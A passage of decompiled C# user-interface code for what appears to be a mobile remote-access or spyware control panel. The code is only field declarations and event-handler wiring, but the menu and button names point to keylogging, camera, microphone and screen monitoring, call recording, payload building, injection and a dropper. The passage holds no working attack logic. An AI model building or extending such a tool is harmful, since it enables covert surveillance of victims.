	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ApplicationsToolStripMenuItem")]
	private ToolStripMenuItem _ApplicationsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem12")]
	private ToolStripMenuItem _ToolStripMenuItem12;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ScreenMonitorToolStripMenuItem")]
	private ToolStripMenuItem _ScreenMonitorToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ScreenReaderToolStripMenuItem")]
	private ToolStripMenuItem _ScreenReaderToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CameraMonitorToolStripMenuItem")]
	private ToolStripMenuItem _CameraMonitorToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MicrophoneMonitorToolStripMenuItem")]
	private ToolStripMenuItem _MicrophoneMonitorToolStripMenuItem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("KeyloggerToolStripMenuItem1")]
	[CompilerGenerated]
	private ToolStripMenuItem _KeyloggerToolStripMenuItem1;

	[CompilerGenerated]
	[AccessedThroughProperty("LiveModeToolStripMenuItem1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _LiveModeToolStripMenuItem1;

	[AccessedThroughProperty("SilentModeGOIPToolStripMenuItem")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _SilentModeGOIPToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("WebBrowserToolStripMenuItem1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _WebBrowserToolStripMenuItem1;

	[AccessedThroughProperty("CallRecorderToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _CallRecorderToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem3")]
	private ToolStripMenuItem _ToolStripMenuItem3;

	[CompilerGenerated]
	[AccessedThroughProperty("RequestAdminRightsToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _RequestAdminRightsToolStripMenuItem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("LockScreenToolStripMenuItem")]
	private ToolStripMenuItem _LockScreenToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem2")]
	private ToolStripMenuItem _ToolStripMenuItem2;

	[AccessedThroughProperty("ToolStripMenuItem5")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem5;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem6")]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem6;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem7")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _ToolStripMenuItem7;

	[AccessedThroughProperty("ToolStripMenuItem8")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem8;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem9")]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem9;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem10")]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NotificationListnerToolStripMenuItem")]
	private ToolStripMenuItem _NotificationListnerToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("CallsListnerToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _CallsListnerToolStripMenuItem;

	[AccessedThroughProperty("PhoneInformationToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _PhoneInformationToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem16")]
	private ToolStripMenuItem _ToolStripMenuItem16;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem17")]
	private ToolStripMenuItem _ToolStripMenuItem17;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem18")]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem18;

	[AccessedThroughProperty("ToolStripMenuItem11")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("KeyboardToolStripMenuItem")]
	private ToolStripMenuItem _KeyboardToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientFolderToolStripMenuItem")]
	private ToolStripMenuItem _ClientFolderToolStripMenuItem;

	[AccessedThroughProperty("ClientsWindow")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIDataGridView _ClientsWindow;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon6")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon6;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	[AccessedThroughProperty("Clients_Btn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _Clients_Btn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("blockbtn")]
	private DrakeUIButtonIcon _blockbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Connection_btn")]
	private DrakeUIButtonIcon _Connection_btn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	[CompilerGenerated]
	private DrakeUIAvatar _DrakeUIAvatar1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem14")]
	private ToolStripMenuItem _ToolStripMenuItem14;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkupdate")]
	[CompilerGenerated]
	private System.Windows.Forms.Timer _checkupdate;

	[AccessedThroughProperty("mapworker")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private BackgroundWorker _mapworker;

	[CompilerGenerated]
	[AccessedThroughProperty("Statustimer")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private System.Windows.Forms.Timer _Statustimer;

	[CompilerGenerated]
	[AccessedThroughProperty("addpo")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _addpo;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("bigtitletext")]
	private Label _bigtitletext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("studiobtn")]
	private DrakeUIButtonIcon _studiobtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("notifiaisbtntop")]
	private DrakeUIButtonIcon _notifiaisbtntop;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon11")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon10")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon10;

	[AccessedThroughProperty("DrakeUIButtonIcon7")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _DrakeUIButtonIcon7;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("serversbtn")]
	[CompilerGenerated]
	private DrakeUIButtonIcon _serversbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("porttext")]
	private DrakeUITextBox _porttext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("rempo")]
	private DrakeUIAvatar _rempo;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVSERVS")]
	private DataGridView _DGVSERVS;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar4")]
	private DrakeUIAvatar _DrakeUIAvatar4;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar9")]
	[CompilerGenerated]
	private DrakeUIAvatar _DrakeUIAvatar9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar8")]
	private DrakeUIAvatar _DrakeUIAvatar8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar5")]
	private DrakeUIAvatar _DrakeUIAvatar5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AllowAppToolStripMenuItem")]
	private ToolStripMenuItem _AllowAppToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem15")]
	private ToolStripMenuItem _ToolStripMenuItem15;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon14")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon14;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon17")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon17;

	[AccessedThroughProperty("DrakeUIButtonIcon18")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon18;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon19")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon19;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar11")]
	private DrakeUIAvatar _DrakeUIAvatar11;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon16")]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon16;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem19")]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem19;

	[AccessedThroughProperty("ToolStripMenuItem21")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _ToolStripMenuItem21;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem22")]
	private ToolStripMenuItem _ToolStripMenuItem22;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem20")]
	private ToolStripMenuItem _ToolStripMenuItem20;

	[AccessedThroughProperty("DrakeUIButtonIcon20")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon20;

	[AccessedThroughProperty("ToolStripMenuItem24")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _ToolStripMenuItem24;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem23")]
	private ToolStripMenuItem _ToolStripMenuItem23;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem25")]
	private ToolStripMenuItem _ToolStripMenuItem25;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("droperbtn")]
	private DrakeUIButtonIcon _droperbtn;

	[AccessedThroughProperty("monitortimer")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private System.Windows.Forms.Timer _monitortimer;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private System.Windows.Forms.Timer _Timer1;

	internal virtual NotifyIcon notfi
	{
		[CompilerGenerated]
		get
		{
			return _notfi;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = notfi_MouseClick;
			NotifyIcon notifyIcon = _notfi;
			if (notifyIcon != null)
			{
				notifyIcon.MouseClick -= value2;
			}
			_notfi = value;
			notifyIcon = _notfi;
			if (notifyIcon != null)
			{
				notifyIcon.MouseClick += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			System.Windows.Forms.Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Mainpanel")]
	internal virtual Panel Mainpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel TopPanel
	{
		[CompilerGenerated]
		get
		{
			return _TopPanel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel1_MouseDown;
			Panel panel = _TopPanel;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_TopPanel = value;
			panel = _TopPanel;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolTip1")]
	internal virtual ToolTip ToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("StatusPanel")]
	internal virtual Panel StatusPanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataLog")]
	public virtual DataGridView DataLog
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("notifiform")]
	internal virtual DrakeUIToolTip notifiform
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar clearbtn
	{
		[CompilerGenerated]
		get
		{
			return _clearbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar3_Click;
			DrakeUIAvatar drakeUIAvatar = _clearbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_clearbtn = value;
			drakeUIAvatar = _clearbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DashboardPanel")]
	internal virtual DrakeUITitlePanel DashboardPanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RecentBox")]
	internal virtual DrakeUIGroupBox RecentBox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lastclientpic")]
	internal virtual DrakeUIAvatar lastclientpic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lastclienttext")]
	internal virtual DrakeUILabel lastclienttext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("SentBox")]
	internal virtual DrakeUIGroupBox SentBox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("senttotal")]
	internal virtual DrakeUILabel senttotal
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ReciveBox")]
	internal virtual DrakeUIGroupBox ReciveBox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIAvatar6")]
	internal virtual DrakeUIAvatar DrakeUIAvatar6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("recvtotal")]
	internal virtual DrakeUILabel recvtotal
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("infobox")]
	internal virtual DrakeUIGroupBox infobox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("infotext")]
	internal virtual DrakeUILabel infotext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIAvatar3")]
	internal virtual DrakeUIAvatar DrakeUIAvatar3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("infopanel")]
	internal virtual Panel infopanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = PictureBox1_MouseDown;
			PictureBox pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
			}
			_PictureBox1 = value;
			pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
			}
		}
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel3_MouseDown;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual Label infolowtext
	{
		[CompilerGenerated]
		get
		{
			return _infolowtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Label2_MouseDown;
			MouseEventHandler value3 = Label2_MouseMove;
			MouseEventHandler value4 = Label2_MouseUp;
			Label label = _infolowtext;
			if (label != null)
			{
				label.MouseDown -= value2;
				label.MouseMove -= value3;
				label.MouseUp -= value4;
			}
			_infolowtext = value;
			label = _infolowtext;
			if (label != null)
			{
				label.MouseDown += value2;
				label.MouseMove += value3;
				label.MouseUp += value4;
			}
		}
	}

	internal virtual DrakeUIButtonIcon Home_Btn
	{
		[CompilerGenerated]
		get
		{
			return _Home_Btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar8_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _Home_Btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Home_Btn = value;
			drakeUIButtonIcon = _Home_Btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon Build_btn
	{
		[CompilerGenerated]
		get
		{
			return _Build_btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _Build_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Build_btn = value;
			drakeUIButtonIcon = _Build_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon inject_btn
	{
		[CompilerGenerated]
		get
		{
			return _inject_btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar9_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _inject_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_inject_btn = value;
			drakeUIButtonIcon = _inject_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon Settings_btn
	{
		[CompilerGenerated]
		get
		{
			return _Settings_btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _Settings_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Settings_btn = value;
			drakeUIButtonIcon = _Settings_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon About_btn
	{
		[CompilerGenerated]
		get
		{
			return _About_btn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon6_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _About_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_About_btn = value;
			drakeUIButtonIcon = _About_btn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("connectionpanel")]
	internal virtual DrakeUITitlePanel connectionpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("infotitlepanel")]
	internal virtual DrakeUITitlePanel infotitlepanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar searchbtn
	{
		[CompilerGenerated]
		get
		{
			return _searchbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Searchbtn_Click;
			DrakeUIAvatar drakeUIAvatar = _searchbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_searchbtn = value;
			drakeUIAvatar = _searchbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUITextBox searchtext
	{
		[CompilerGenerated]
		get
		{
			return _searchtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Searchtext_TextChanged;
			DrakeUITextBox drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_searchtext = value;
			drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon uncheckbtn
	{
		[CompilerGenerated]
		get
		{
			return _uncheckbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = B_ok_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _uncheckbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_uncheckbtn = value;
			drakeUIButtonIcon = _uncheckbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TCavatar")]
	internal virtual PictureBox TCavatar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon8
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon8_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon8;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon8 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon8;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon HBlockbtn
	{
		[CompilerGenerated]
		get
		{
			return _HBlockbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon11_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _HBlockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_HBlockbtn = value;
			drakeUIButtonIcon = _HBlockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon Hinfobtn
	{
		[CompilerGenerated]
		get
		{
			return _Hinfobtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon10_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _Hinfobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Hinfobtn = value;
			drakeUIButtonIcon = _Hinfobtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon clientfoldrbtn
	{
		[CompilerGenerated]
		get
		{
			return _clientfoldrbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Clientfoldrbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _clientfoldrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_clientfoldrbtn = value;
			drakeUIButtonIcon = _clientfoldrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon9
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon9_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon9;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon9 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon9;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

